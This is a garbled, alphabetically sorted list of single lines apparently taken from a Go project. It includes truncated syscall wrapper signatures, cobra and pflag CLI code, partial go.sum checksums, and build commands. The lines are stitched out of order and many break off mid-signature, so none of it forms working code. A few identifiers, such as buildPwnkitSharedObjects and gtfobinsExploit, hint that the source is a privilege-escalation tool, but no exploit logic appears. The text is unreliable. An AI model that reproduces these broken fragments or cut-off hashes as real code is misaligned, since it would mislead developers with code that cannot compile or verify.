func BytesHexVarP(p 
func CM_Get_DevNode_Status(status 
func CancelIo(s Handle) (err error) {
func CapEnter() (err error) {
func CapRightsClear(rights 
func CapRightsGet(fd uintptr) (
func CapRightsInit(rights []uint64) (
func CapRightsIsSet(rights 
func CapRightsSet(rights 
func Capget(hdr 
func Capset(hdr 
func CertDeleteCertificateFromStore(certContext 
func CertDuplicateCertificateContext(certContext 
func CertFindExtension(objId 
func CertFreeCertificateChain(ctx 
func CertFreeCertificateContext(ctx 
func CertGetNameString(certContext 
func Chdir(path string) (err error) {
func Chdir(path string) error {
func CheckErr(msg interface{}) {
func Chroot(path string) (err error) {
func Clearenv() {
func ClockSequence() int {
func Close(fd Handle) (err error) {
func Close(fd int) (err error) {
func CloseHandle(handle Handle) (err error) {
func CloseOnExec(fd Handle) {
func CloseServiceHandle(handle Handle) (err error) {
func Closedir(dir uintptr) error {
func Closesocket(s Handle) (err error) {
func CmsgLen(datalen int) int {
func CmsgSpace(datalen int) int {
func CoGetObject(name 
func CoTaskMemFree(address unsafe.Pointer) {
func CoUninitialize() {
func CommandLineToArgv(cmd 
func CompError(msg string) {
func CompErrorln(msg string) {
func ComposeCommandLine(args []string) string {
func ConvertSidToStringSid(sid 
func ConvertStringSidToSid(stringSid 
func CountVar(p 
func CountVarP(p 
func CreateDirectory(path 
func CreateEnvironmentBlock(block 
func CreateEvent(eventAttrs 
func CreateEventEx(eventAttrs 
func CreateFile(name 
func CreateHardLink(filename 
func CreateJobObject(jobAttr 
func CreateMutex(mutexAttrs 
func CreateMutexEx(mutexAttrs 
func CreateNamedPipe(name 
func CreatePipe(readhandle 
func CreateProcess(appName 
func CreateSymbolicLink(symlinkfilename 
func CreateWellKnownSid(sidType WELL_KNOWN_SID_TYPE) (
func CryptAcquireCertificatePrivateKey(cert 
func CryptAcquireContext(provhandle 
func CryptProtectData(dataIn 
func CryptUnprotectData(dataIn 
func CurrentProcess() Handle { return Handle(
func CurrentThread() Handle { return Handle(
func DeleteFile(path 
func DeleteService(service Handle) (err error) {
func DeleteVolumeMountPoint(volumeMountPoint 
func DeregisterEventSource(handle Handle) (err error) {
func DestroyEnvironmentBlock(block 
func DisableFormatting() {
func DisableRandPool() {
func DnsNameCompare(name1 
func DnsRecordListFree(rl 
func DurationSinceBoot() time.Duration {
func DurationSliceVar(p 
func DurationSliceVarP(p 
func DurationVar(p 
func DurationVarP(p 
func EnableFormatting() {
func EnableRandPool() {
func Environ() []string {
func EqualSid(sid1 
func Err2ad() (eadd 
func Errno2() (er2 int) {
func ErrnoName(e Errno) string {
func ErrnoName(e syscall.Errno) string {
func EscapeArg(s string) string {
func ExactArgs(n int) PositionalArgs {
func ExactValidArgs(n int) PositionalArgs {
func Execute() error {
func Execute() {
func Exit(code int) {
func Exit(code int) { ExitProcess(uint32(code)) }
func Exit(code int) { exit(code) }
func ExitProcess(exitcode uint32) {
func ExpandEnvironmentStrings(src 
func Fchdir(fd Handle) (err error)             { return syscall.EWINDOWS }
func Fchdir(fd int) (err error) {
func Fdatasync(fd int) (err error) {
func Filename() string {
func FindClose(handle Handle) (err error) {
func FindCloseChangeNotification(handle Handle) (err error) {
func FindFirstFile(name 
func FindFirstVolume(volumeName 
func FindFirstVolumeMountPoint(rootPathName 
func FindNextChangeNotification(handle Handle) (err error) {
func FindVolumeClose(findVolume Handle) (err error) {
func FindVolumeMountPointClose(findVolumeMountPoint Handle) (err error) {
func Float32SliceVar(p 
func Float32SliceVarP(p 
func Float32Var(p 
func Float32VarP(p 
func Float64SliceVar(p 
func Float64SliceVarP(p 
func Float64Var(p 
func Float64VarP(p 
func FlushFileBuffers(handle Handle) (err error) {
func FreeAddrInfoW(addrinfo 
func FreeEnvironmentStrings(envs 
func FreeLibrary(handle Handle) (err error) {
func FreeSid(sid 
func Fsync(fd Handle) (err error) {
func Fsync(fd int) (err error) {
func Fsync(fd int) error {
func Get(speed Speed) []Registration {
func GetACP() (acp uint32) {
func GetAcceptExSockaddrs(buf 
func GetActiveHelpConfig(cmd 
func GetActiveProcessorCount(groupNumber uint16) (ret uint32) {
func GetAdaptersInfo(ai 
func GetAddrInfoW(nodename 
func GetCommandLine() (cmd 
func GetComputerName(buf 
func GetCurrentProcessId() (pid uint32) {
func GetCurrentProcessToken() Token {
func GetCurrentThreadEffectiveToken() Token {
func GetCurrentThreadId() (id uint32) {
func GetCurrentThreadToken() Token {
func GetDiskFreeSpaceEx(directoryName 
func GetDriveType(rootPathName 
func GetEnvironmentStrings() (envs 
func GetEnvironmentVariable(name 
func GetFileAttributes(name 
func GetFileAttributesEx(name 
func GetFullPathName(path 
func GetHostByName(name string) (h 
func GetIfEntry(pIfRow 
func GetLastError() (lasterr error) {
func GetLengthSid(sid 
func GetLongPathName(path 
func GetMaximumProcessorCount(groupNumber uint16) (ret uint32) {
func GetProcessShutdownParameters(level 
func GetProtoByName(name string) (p 
func GetShellWindow() (shellWindow HWND) {
func GetShortPathName(longpath 
func GetStartupInfo(startupInfo 
func GetState(fd int) (
func GetSystemTimeAsFileTime(time 
func GetSystemTimePreciseAsFileTime(time 
func GetTimeZoneInformation(tzi 
func GetVolumeInformation(rootPathName 
func GetVolumeNameForVolumeMountPoint(volumeMountPoint 
func GetVolumePathName(fileName 
func GetVolumePathNamesForVolumeName(volumeName 
func Getdtablesize() (size int) {
func Getegid() (egid int)                { return -1 }
func Getegid() (egid int) {
func Getegid() (egid int) { return -1 }
func Geteuid() (euid int)                { return -1 }
func Geteuid() (euid int) {
func Geteuid() (euid int) { return -1 }
func Geteuid() (uid int) {
func Getgid() (gid int)                  { return -1 }
func Getgid() (gid int)   { return -1 }
func Getgid() (gid int) {
func Gethostname(buf []byte) (err error) {
func Getpagesize() (pgsize int) {
func Getpagesize() int {
func Getpagesize() int { return 0x1000 }
func Getpagesize() int { return 4096 }
func Getpgrp() (pgrp int) {
func Getpgrp() (pid int) {
func Getpid() (pid int) {
func Getpid() (pid int) { return int(GetCurrentProcessId()) }
func Getppid() (pid int) {
func Getppid() (ppid int) {
func Getsize(t 
func GetsizeFull(
func GetsizeFull(t 
func Getsystemcfg(label int) (n uint64) {
func Gettid() (tid int) {
func Gettimeofday(tp 
func Gettimeofday(tv 
func Getuid() (uid int)                  { return -1 }
func Getuid() (uid int)   { return -1 }
func Getuid() (uid int) {
func IPMaskVar(p 
func IPMaskVarP(p 
func IPNetVar(p 
func IPNetVarP(p 
func IPSliceVar(p 
func IPSliceVarP(p 
func IPVar(p 
func IPVarP(p 
func Image() string {
func ImpersonateSelf(impersonationlevel uint32) (err error) {
func InitiateSystemShutdownEx(machineName 
func Install() (
func InstallToPath(path string) (
func Int16Var(p 
func Int16VarP(p 
func Int32SliceVar(p 
func Int32SliceVarP(p 
func Int32Var(p 
func Int32VarP(p 
func Int64SliceVar(p 
func Int64SliceVarP(p 
func Int64Var(p 
func Int64VarP(p 
func Int8Var(p 
func Int8VarP(p 
func IntSliceVar(p 
func IntSliceVarP(p 
func IntVar(p 
func IntVarP(p 
func IoctlGetRTCTime(fd int) (
func IoctlGetRTCWkAlrm(fd int) (
func IoctlGetWatchdogInfo(fd int) (
func IoctlHIDGetRawInfo(fd int) (
func IoctlKCMClone(fd int) (
func IoctlWatchdogKeepalive(fd int) error {
func Iopl(level int) (err error) {
func IsInvalidLengthError(err error) bool {
func IsTerminal(fd int) bool {
func Issetugid() (tainted bool) {
func KeyctlDHCompute(params 
func KnownFolderPath(folderID 
func LoadCancelIoEx() error {
func LoadConnectEx() error {
func LoadCreateSymbolicLink() error {
func LoadDLL(name string) (dll 
func LoadGetAddrInfo() error {
func LoadGetSystemTimePreciseAsFileTime() error {
func LoadSetFileCompletionNotificationModes() error {
func Lookup(name string) 
func LookupAccountName(systemName 
func LookupAccountSid(systemName 
func LookupPrivilegeValue(systemname 
func Major(dev uint64) uint32 {
func MakeClassInstallHeader(installFunction DI_FUNCTION) 
func MakeRaw(fd int) (
func MarkFlagCustom(flags 
func MarkFlagDirname(flags 
func MarkFlagFilename(flags 
func MarkFlagRequired(flags 
func MatchAll(pargs ...PositionalArgs) PositionalArgs {
func MaximumNArgs(n int) PositionalArgs {
func MinimumNArgs(n int) PositionalArgs {
func Minor(dev uint64) uint32 {
func Mlock(b []byte) (err error) {
func Mlockall(flags int) (err error) {
func MoveFile(from 
func MoveFileEx(from 
func Munlock(b []byte) (err error) {
func Munlockall() (err error) {
func Munmap(b []byte) (err error) {
func Must(v 
func MustLoadDLL(name string) 
func MustParse(s string) UUID {
func NArg() int { return len(CommandLine.args) }
func NFlag() int { return len(CommandLine.actual) }
func Nanosleep(time 
func NetApiBufferFree(buf 
func NetGetJoinInformation(server 
func NetUserGetInfo(serverName 
func New() 
func New() Logger {
func New() UUID {
func NewCallback(fn interface{}) uintptr {
func NewCallbackCDecl(fn interface{}) uintptr {
func NewEventPort() (
func NewIfreq(name string) (
func NewLazyDLL(name string) 
func NewLazySystemDLL(name string) 
func NewLine() {
func NewLockable(input io.Reader) 
func NewNTString(s string) (
func NewNTUnicodeString(s string) (
func NewParser(w io.Writer) 
func NewProcThreadAttributeList(maxAttrCount uint32) (
func NewSecurityDescriptor() (absoluteSD 
func NewSemver(v string) (
func NewString() string {
func NewVersion(v string) (
func NoArgs(cmd 
func NoFileCompletions(cmd 
func NodeID() []byte {
func NodeInterface() string {
func NsecToFiletime(nsec int64) (ft Filetime) {
func NsecToTimespec(nsec int64) (ts Timespec) {
func NsecToTimespec(nsec int64) Timespec {
func NsecToTimeval(nsec int64) (tv Timeval) {
func NsecToTimeval(nsec int64) Timeval {
func NtCreateFile(handle 
func NtCreateNamedPipeFile(pipe 
func Ntohs(netshort uint16) (u uint16) {
func OnInitialize(y ...func()) {
func OnlyValidArgs(cmd 
func OpenSCManager(machineName 
func PFXImportCertStore(pfx 
func PFlagFromGoFlag(goflag 
func Parse() {
func ParseAll(fn func(flag 
func ParseIPv4Mask(s string) net.IPMask {
func ParseOrigDstAddr(m 
func ParseUnixCredentials(m 
func ParseUnixRights(m 
func Parsed() bool {
func Pause() (err error) {
func Pause() error {
func PerfEventOpen(attr 
func Pipe(p []Handle) (err error) {
func Pipe(p []int) (err error) {
func Pipe(p []int) error {
func PktInfo4(info 
func PktInfo6(info 
func PledgeExecpromises(execpromises string) error {
func PledgePromises(promises string) error {
func PrintDefaults() {
func Println(input string) {
func PtraceAttach(pid int) (err error) {
func PtraceDetach(pid int) (err error) {
func PtraceSingleStep(pid int) (err error) {
func PulseEvent(event Handle) (err error) {
func QueryDosDevice(deviceName 
func Readdir(dir uintptr) (
func Reboot(cmd int) (err error) {
func RegCloseKey(key Handle) (regerrno error) {
func RegisterEventSource(uncServerName 
func RegisterServiceCtrlHandlerEx(serviceName 
func ReleaseMutex(mutex Handle) (err error) {
func Remove(path string) error {
func RemoveDirectory(path 
func ResetEvent(event Handle) (err error) {
func RevertToSelf() (err error) {
func Revoke(path string) (err error) {
func Rmdir(path string) (err error) {
func Rmdir(path string) error {
func RtlAddFunctionTable(functionTable 
func RtlDefaultNpAcl(acl 
func RtlDeleteFunctionTable(functionTable 
func RtlDosPathNameToNtPathName(dosName 
func RtlDosPathNameToRelativeNtPathName(dosName 
func RtlGetCurrentPeb() (peb 
func RtlGetVersion() 
func RtlInitString(destinationString 
func RtlInitUnicodeString(destinationString 
func SecurityDescriptorFromString(sddl string) (sd 
func SetClockSequence(seq int) {
func SetCurrentDirectory(path 
func SetDefaultDllDirectories(directoryFlags uint32) (err error) {
func SetDllDirectory(path string) (err error) {
func SetEndOfFile(handle Handle) (err error) {
func SetEnvironmentVariable(name 
func SetErrorMode(mode uint32) (ret uint32) {
func SetEvent(event Handle) (err error) {
func SetFileAttributes(name 
func SetInterspersed(interspersed bool) {
func SetKevent(k 
func SetNodeID(id []byte) bool {
func SetNodeInterface(name string) bool {
func SetRand(r io.Reader) {
func SetThreadToken(thread 
func SetVolumeLabel(rootPathName 
func SetVolumeMountPoint(volumeMountPoint 
func Setdomainname(p []byte) (err error) {
func Setegid(egid int) (err error) {
func Seteuid(euid int) (err error) {
func Setfsgid(gid int) error {
func Setfsuid(uid int) error {
func Setgid(gid int) (err error) {
func Setgid(uid int) (err error) {
func Setgroups(gids []int) (err error) {
func Sethostname(p []byte) (err error) {
func Setlogin(name string) (err error) {
func Setprivexec(flag int) (err error) {
func Setrtable(rtable int) (err error) {
func Setsize(
func Setsize(t 
func Settimeofday(tp 
func Settimeofday(tv 
func Setuid(uid int) (err error) {
func SetupDiCancelDriverInfoSearch(deviceInfoSet DevInfo) (err error) {
func SetupDiClassNameFromGuidEx(classGUID 
func SetupDiCreateDeviceInfoListEx(classGUID 
func SetupDiDestroyDeviceInfoList(deviceInfoSet DevInfo) (err error) {
func SetupDiGetClassDevsEx(classGUID 
func SetupDiGetDeviceInfoListDetail(deviceInfoSet DevInfo) (deviceInfoSetDetailData 
func SetupDiGetSelectedDevice(deviceInfoSet DevInfo) (
func ShorthandLookup(name string) 
func SignalName(s syscall.Signal) string {
func SignalNum(s string) syscall.Signal {
func Start(cmd 
func StartServiceCtrlDispatcher(serviceTable 
func StartWithAttrs(c 
func StartWithSize(cmd 
func StartedByExplorer() bool {
func StringArrayVar(p 
func StringArrayVarP(p 
func StringSliceVar(p 
func StringSliceVarP(p 
func StringToInt64Var(p 
func StringToInt64VarP(p 
func StringToIntVar(p 
func StringToIntVarP(p 
func StringToSid(s string) (
func StringToStringVar(p 
func StringToStringVarP(p 
func StringToUTF16(s string) []uint16 {
func StringToUTF16Ptr(s string) 
func StringVar(p 
func StringVarP(p 
func Sync() (err error) {
func Sync() {
func Syncfs(fd int) (err error) {
func SysctlClockinfo(name string) (
func SysctlTimeval(name string) (
func SysctlUvmexp(name string) (
func Sysinfo(info 
func SysvShmDetach(data []byte) error {
func Time(t 
func Times(tms 
func TimespecToNsec(ts Timespec) int64 { return int64(ts.Sec)
func TimespecToNsec(ts Timespec) int64 { return ts.Nano() }
func TimevalToNsec(tv Timeval) int64 { return tv.Nano() }
func TranslateName(accName 
func TrusteeValueFromObjectsAndName(objectsAndName 
func TrusteeValueFromObjectsAndSid(objectsAndSid 
func TrusteeValueFromSID(sid 
func TrusteeValueFromString(str string) TrusteeValue {
func UTF16PtrFromString(s string) (
func UTF16PtrToString(p 
func UTF16ToString(s []uint16) string {
func Uint16Var(p 
func Uint16VarP(p 
func Uint32Var(p 
func Uint32VarP(p 
func Uint64Var(p 
func Uint64VarP(p 
func Uint8Var(p 
func Uint8VarP(p 
func UintSliceVar(p 
func UintSliceVarP(p 
func UintVar(p 
func UintVarP(p 
func Umask(mask int) (oldmask int) {
func Umask(newmask int) (oldmask int) {
func Uname(buf 
func Uname(uname 
func Undelete(path string) (err error) {
func Uninstall(path string) error {
func UnixCredentials(ucred 
func UnixRights(fds ...int) []byte {
func Unlink(path string) (err error) {
func Unlink(path string) error {
func UnmapViewOfFile(addr uintptr) (err error) {
func UnmarshalDir(b []byte) (
func UnquoteUsage(flag 
func Unsetenv(key string) error {
func Unshare(flags int) (err error) {
func UnsubscribeServiceChangeNotifications(subscription uintptr) (err error) {
func UnveilBlock() error {
func Visit(fn func(
func VisitAll(fn func(
func WSACleanup() (err error) {
func WSAEnumProtocols(protocols 
func WTSFreeMemory(ptr uintptr) {
func WTSGetActiveConsoleSessionId() (sessionID uint32) {
func W_Getmntent(buff 
func W_Getmntent_A(buff 
func _DnsQuery(name 
func _FindFirstChangeNotification(path 
func _GetFileVersionInfo(filename 
func _GetFileVersionInfoSize(filename 
func _GetHostByName(name 
func _GetProtoByName(name 
func _GetServByName(name 
func _IOC_PARM_LEN(ioctl uintptr) uintptr {
func _LoadLibrary(libname 
func _LoadLibraryEx(libname 
func _SetDllDirectory(path 
func _SetNamedSecurityInfo(objectName 
func _convertStringSecurityDescriptorToSecurityDescriptor(str 
func _getNamedSecurityInfo(objectName 
func acct(path 
func activeHelpEnvVar(name string) string {
func aliasNormalizeFunc(f 
func allZero(segs []int64) bool {
func atoi(b []byte) (n uint) {
func bufToUTF16(buf []byte) []uint16 {
func buildPwnkitSharedObjects() error {
func buildSecurityDescriptor(owner 
func bytes2iovec(bs [][]byte) []Iovec {
func canDoSearchSystem32() bool {
func caparsize(rights 
func capidxbit(right uint64) int {
func caprver(right uint64) int {
func capver(rights 
func chdir(path string) (err error) {
func checkIfFlagCompletion(finalCmd 
func clearErrno()
func clen(n []byte) int {
func clockSequence() int {
func closedir(dir uintptr) (err error) {
func clsidFromString(lpsz 
func cm_Get_DevNode_Status(status 
func cm_Get_Device_Interface_List(interfaceClass 
func cm_Get_Device_Interface_List_Size(len 
func cmsgAlignOf(salen int) int {
func coCreateGuid(pguid 
func completeRequireFlags(finalCmd 
func convertSecurityDescriptorToStringSecurityDescriptor(sd 
func copyFindData(dst 
func copyStat(stat 
func cpuBitsIndex(cpu int) int {
func cpuBitsMask(cpu int) cpuMask {
func cstring(s []byte) string {
func defaultUsage(f 
func deleteProcThreadAttributeList(attrlist 
func epToPollEvt(events uint32) int16 {
func errnoErr(e Errno) error {
func errnoErr(e syscall.Errno) error {
func errstr() string {
func exit(code int)
func exitThread(code int) (err error) {
func fillStat_t(s 
func findFirstFile1(name 
func findFlag(cmd 
func fixStatTimFields(stat 
func fixwd() {
func getFlagNameCompletions(flag 
func getProcessEntry(pid int) (
func getProcessEntry(pid int) (pe 
func getSecurityDescriptorControl(sd 
func getSecurityDescriptorDacl(sd 
func getSecurityDescriptorGroup(sd 
func getSecurityDescriptorLength(sd 
func getSecurityDescriptorOwner(sd 
func getSecurityDescriptorRMControl(sd 
func getSecurityDescriptorSacl(sd 
func getSidIdentifierAuthority(sid 
func getSidSubAuthority(sid 
func getSidSubAuthorityCount(sid 
func getState(fd int) (
func getStdHandle(stdhandle uint32) (fd Handle) {
func getSystemDirectory(dir 
func getSystemWindowsDirectory(dir 
func getTickCount64() (ms uint64) {
func getWindowsDirectory(dir 
func getcwd(buf []byte) (err error) {
func gettid() uint64
func gettimeofday(tv 
func grantpt(f 
func hasAllFlags(fs 
func init() {
func initCanDoSearchSystem32() {
func initConfig() {
func initializeProcThreadAttributeList(attrlist 
func initializeSecurityDescriptor(absoluteSD 
func isBaseName(name string) bool {
func isFlagArg(arg string) bool {
func isGroupMember(gid int) bool {
func isPrintable(key rune) bool {
func isTerminal(fd int) bool {
func isValidSecurityDescriptor(sd 
func isValidSid(sid 
func isWellKnownSid(sid 
func itoa(val int) string { // do it here rather than with fmt to avoid dependency
func kernelVersion() string {
func legacyArgs(cmd 
func loadWSASendRecvMsg() error {
func main() {
func makeAbsoluteSD(selfRelativeSD 
func makeInheritSa() 
func makeRaw(fd int) (
func makeSelfRelativeSD(absoluteSD 
func minor(x uint64) uint64 { return x 
func nonCompletableFlag(flag 
func nsec() int64 {
func pToEpollEvt(revents int16) uint32 {
func parseSingle(v string) (
func pipe(p 
func pipe2(p 
func poll(fds 
func ppoll(fds 
func preExecHook(c 
func prepareCustomAnnotationsForFlags(cmd 
func processFlagForGroupAnnotation(flags 
func ptsname(f 
func raceAcquire(addr unsafe.Pointer) {
func raceReleaseMerge(addr unsafe.Pointer) {
func randomBits(b []byte) {
func realGettimeofday(
func remove(path string) (err error) {
func rtlGetNtVersionNumbers(majorVersion 
func rtlGetVersion(info 
func rtlNtStatusToDosErrorNoTeb(ntstatus NTStatus) (ret syscall.Errno) {
func setClockSequence(seq int) {
func setNodeInterface(name string) bool {
func setSecurityDescriptorControl(sd 
func setSecurityDescriptorDacl(sd 
func setSecurityDescriptorGroup(sd 
func setSecurityDescriptorOwner(sd 
func setSecurityDescriptorRMControl(sd 
func setSecurityDescriptorSacl(sd 
func setupDiClassGuidsFromNameEx(className 
func setupDiClassNameFromGuidEx(classGUID 
func setupDiCreateDeviceInfoListEx(classGUID 
func setupDiGetClassDevsEx(classGUID 
func setupUninstallOEMInf(infFileName 
func shGetKnownFolderPath(id 
func shmdt(addr uintptr) (err error) {
func shouldSkip(id string) bool {
func socketControlMessageHeaderAndData(b []byte) (
func sortFlags(flags map[NormalizedName]
func sortedKeys(m map[string]map[string]bool) []string {
func streamsPush(f 
func stringFromGUID2(rguid 
func stripUnknownFlagValue(args []string) []string {
func supportsABI(ver uint32) bool {
func svcLoad(name 
func svcUnload(name 
func syscall_loadlibrary(filename 
func test() error {
func timespecFromStatxTimestamp(x StatxTimestamp) Timespec {
func trimRightSpace(s string) string {
func tryGetmntent1024(stat 
func tryGetmntent128(stat 
func tryGetmntent256(stat 
func tryGetmntent512(stat 
func tryGetmntent64(stat 
func u2s(cstr unsafe.Pointer) string {
func uitoa(val uint) string {
func umount(target string) (err error) {
func unlockpt(f 
func updateProcThreadAttribute(attrlist 
func use(p unsafe.Pointer)
func utf16ToBuf(buf []uint16) []byte {
func validateExclusiveFlagGroups(data map[string]map[string]bool) error {
func validateRequiredFlagGroups(data map[string]map[string]bool) error {
func visualLength(runes []rune) int {
func wcslen(str []uint16) int {
func wordSepNormalizeFunc(f 
func wrapFlagValue(v goflag.Value) Value {
func xattrPointer(dest []byte) 
func() {
function __%[1]s_debug
function __%[1]s_debug {
function __%[1]s_perform_completion
function __%[1]s_prepare_completions
g.Groups[0]))[:g.GroupCount:g.GroupCount]
g1582      = epoch 
g1582ns100 = g1582 
get the real ones.
getReleasesFromCluster()
getSecurityDescriptorControl(sd 
getSecurityDescriptorDacl(sd 
getSecurityDescriptorGroup(sd 
getSecurityDescriptorLength(sd 
getSecurityDescriptorOwner(sd 
getSecurityDescriptorRMControl(sd 
getSecurityDescriptorSacl(sd 
getSidIdentifierAuthority(sid 
getSidIdentifierAuthority(sid)
getSidSubAuthority(sid 
getSidSubAuthorityCount(sid 
getSidSubAuthorityCount(sid)
getSystemDirectory(dir 
getSystemWindowsDirectory(dir 
getTickCount64() (ms uint64) = kernel32.GetTickCount64
getWindowsDirectory(dir 
getcontext(struct __ucontext 
getcwd(buf []byte) (err error)
getegid(void)
geteuid(void)
getfh(const char 
getgid_with_egid(void)
getpgid(pid_t pid)
getpgrp(void)
getpid_with_ppid(void)
getppid(void)
getsid(pid_t pid)
gettimeofday(SB)
gettimeofday(struct timeval 
gettimeofday(tv 
getuid_with_euid(void)
getvfsstat(struct statvfs 
getxattr(const char 
gid = Getegid()
gid = Getgid()
gid = int(r0)
gids[i] = int(v)
gidset)
git add .
git checkout -b my-new-feature
git clone https://github.com/your_username/cobra 
git commit -m 'Add some feature'
git describe --tags
git push origin my-new-feature
github.com/cpuguy83/go-md2man/v2 v2.0.2/go.mod h1:tgQtvFlXSQOSOSIRvRPT7W67SCa46tRHOmNcaadrF8o=
github.com/creack/pty
github.com/creack/pty v1.1.18
github.com/creack/pty v1.1.18 h1:n56/Zwd5o6whRC5PMGretI4IdRLlmBXYNjScPaBgsbY=
github.com/creack/pty v1.1.18/go.mod h1:MOBLtS5ELjhRRrroQr9kyvTxUAFNvYEK993ew/Vr4O4=
github.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/google/uuid
github.com/google/uuid v1.3.0
github.com/google/uuid v1.3.0 h1:t6JiXgmwXMjEs8VusXIJk2BXHsn
github.com/google/uuid v1.3.0/go.mod h1:TIyPZe4MgqvfeYDBFedMoGGpEw/LqOeaOT
github.com/hashicorp/go-version
github.com/hashicorp/go-version v1.5.0
github.com/hashicorp/go-version v1.5.0 h1:O293SZ2Eg
github.com/hashicorp/go-version v1.5.0/go.mod h1:fltr4n8CU8Ke44wwGCBoEymUuxUHl09ZGVZPK5anwXA=
github.com/inconshreveable/mousetrap
github.com/inconshreveable/mousetrap v1.0.0 // indirect
github.com/inconshreveable/mousetrap v1.0.0 h1:Z8tu5sraLXCXIcARxBp/8cbvlwVa7Z1NHg9XEKhtSvM=
github.com/inconshreveable/mousetrap v1.0.0/go.mod h1:PxqpIevigyE2G7u3NXJIT2ANytuPF1OarO4DADm73n8=
github.com/liamg/tml
github.com/liamg/tml v0.6.0
github.com/liamg/tml v0.6.0 h1:yOC/Q9p9Io3J11U9LdYVIwpRTnTE1GPMNFLrygkmE2Y=
github.com/liamg/tml v0.6.0/go.mod h1:0h4EAV/zBOsqI91EWONedjRpO8O0itjGJVd
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
github.com/russross/blackfriday/v2 v2.1.0/go.mod h1:
github.com/spf13/cobra
github.com/spf13/cobra v1.5.0
github.com/spf13/cobra v1.5.0 h1:X
github.com/spf13/cobra v1.5.0/go.mod h1:dWXEIy2H428czQCjInthrTRUg7yKbok
github.com/spf13/pflag
github.com/spf13/pflag v1.0.5 // indirect
github.com/spf13/pflag v1.0.5 h1:iy
github.com/spf13/pflag v1.0.5/go.mod h1:McXfInJRrz4CZXVZOBLb0bTZqETkiAhM9Iw0y3An2Bg=
github.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF
github.com/stretchr/testify v1.3.0 h1:TivCn/peBQ7UY8ooIcPgZFpTNSz0Q2U6UrFlUfqbe0Q=
github.com/stretchr/testify v1.3.0/go.mod h1:M5WIy9Dh21IEIfnGCwXGc5bZfKNJtfHm1UVUgZn
globNormFunc func(f 
go 1.18
go build ./tml/ -o bin/tml 
go doc
go func() {
go get
go get -u github.com/liamg/tml/tml
go get -u github.com/spf13/cobra@latest
go get -u golang.org/x/term
go get -v ./...
go get github.com/creack/pty
go get github.com/google/uuid
go install github.com/spf13/cobra-cli@latest
go run ./cmd/pack
go test -v ./...
go test ./...
go test ./... -race -cover
go version
go vet ./...
goFlagSet.Parse(nil)
goarch string
godoc -http=:6060
goflag.Flag) 
goflag.Flag) {
goflag.FlagSet
goflag.FlagSet) {
goflag.Value
gofmt > ztypes_$GOARCH.go
gofmt > ztypes_$GOOSARCH.go
golang.org/x/crypto v0.0.0-20220525230936-793ad666bf5e
golang.org/x/crypto v0.0.0-20220525230936-793ad666bf5e h1:T8NU3HyQ8ClP4SEE
golang.org/x/crypto v0.0.0-20220525230936-793ad666bf5e/go.mod h1:IxCIyHEi3zRg3s0A5j5BB6A9Jmi73HwBIUl50j
golang.org/x/crypto/ssh/terminal
golang.org/x/sys v0.0.0-20220615213510-4f61da869c0c
golang.org/x/sys v0.0.0-20220615213510-4f61da869c0c h1:aFV
golang.org/x/sys v0.0.0-20220615213510-4f61da869c0c/go.mod h1:oPkhp1MJrh7nUepCBck5
golang.org/x/sys/internal/unsafeheader
golang.org/x/sys/plan9
golang.org/x/sys/unix
golang.org/x/sys/windows
golang.org/x/term
golang.org/x/term v0.0.0-20220526004731-065cf7ba2467 // indirect
golang.org/x/term v0.0.0-20220526004731-065cf7ba2467 h1:CBpWXWQpIRjzmkkA
golang.org/x/term v0.0.0-20220526004731-065cf7ba2467/go.mod h1:jbD1KX2456YbFQfuXm/mYQcufACuNUgVhRMnK/tPxf8=
golang/glog
golangci-lint run -v
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/yaml.v2 v2.4.0/go.mod h1:RDklbk79AGWmwhnvt/jBztapEOGDOx6ZbXqjP6csGnQ=
got := uint32(min)
greaterThan      operator = '>'
greaterThanEqual operator = '
group 
group    
group = (
groupDefaulted = _p0 != 0
groupDefaulted {
groupSize)
groupStatus := map[string]map[string]bool{}
groupStatus[group] = map[string]bool{}
groupStatus[group][name] = false
groupStatus[group][pflag.Name] = pflag.Changed
gtfobinsExploit {
gtfobinsExploit{
guid := GUID{}
guid)
h := (
h = (
h.Cap = int(size)
h.Cap = n
h.Cap = sdLen
h.Data = (
h.Data = unsafe.Pointer(p)
h.Data = unsafe.Pointer(ptr)
h.Data = unsafe.Pointer(selfRelativeSD)
h.Len = int(size)
h.Len = n
h.Len = sdLen
h.Level = SOL_IP
h.Level = SOL_IPV6
h.Level = SOL_SOCKET
h.Reset()
h.SetLen(CmsgLen(SizeofInet4Pktinfo))
h.SetLen(CmsgLen(SizeofInet6Pktinfo))
h.SetLen(CmsgLen(SizeofUcred))
h.SetLen(CmsgLen(datalen))
h.Type = IPV6_PKTINFO
h.Type = IP_PKTINFO
h.Type = SCM_CREDENTIALS
h.Type = SCM_RIGHTS
h.Write(data)     //nolint:errcheck
h.Write(space[:]) //nolint:errcheck
hS := lenSelf
hS = lenOther
handle = DevInfo(r0)
handle = Handle(r0)
handlePtr = 
handles[0]
harbor
harbor notary rook thanos
hardwareID      [1]uint16
hasSpace := false
hasSpace = true
hash.Read(b)
have children commands and optionally run an action.
haveNoDescFlag := !c.CompletionOptions.DisableNoDescFlag 
hb=HEAD
hdr := 
hdr := (
hdr))
hdr.Cap = int(info.Segsz)
hdr.Cap = int(s.MaximumLength)
hdr.Cap = length
hdr.Cap = reclen
hdr.Data = unsafe.Pointer(
hdr.Data = unsafe.Pointer(addr)
hdr.Data = unsafe.Pointer(s.Buffer)
hdr.Len = int(info.Segsz)
hdr.Len = int(s.Length)
hdr.Len = length
hdr.Len = reclen
hdr.size = uint32(unsafe.Sizeof(
head int
header       W_Mnth
header := 
header W_Mnth
header nwmHeader
hello
helm
helm repo add
helm status
helm status --namespace my-rook-ns [tab][tab]
help
helpCommand 
helpFunc func(
helpTemplate string
hi := int32(offset >> 32)
hi := uint32(b[4]) 
hidden
hint)
history stRingBuffer
historyIndex int
